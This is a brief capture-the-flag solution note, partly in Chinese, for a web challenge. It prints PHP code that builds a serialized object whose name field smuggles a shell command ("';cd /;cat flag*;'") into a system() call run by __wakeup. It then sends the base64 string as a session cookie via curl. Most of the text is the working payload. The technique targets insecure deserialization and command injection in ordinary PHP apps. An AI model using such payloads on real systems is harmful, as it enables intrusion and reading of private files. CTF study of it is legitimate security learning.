http://h4ck3r.quest:8601/




solve:
https://sandbox.onlinephpfunctions.com/

輸入
<?php
class Cat
{
    public $name = 'ls';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}

$cat = new Cat("';cd /;cat flag*;'");
  $session = base64_encode(serialize($cat));
  echo $session;


?>


2.
solve.sh :把產生出來的字串 當成 session 用curl傳過去
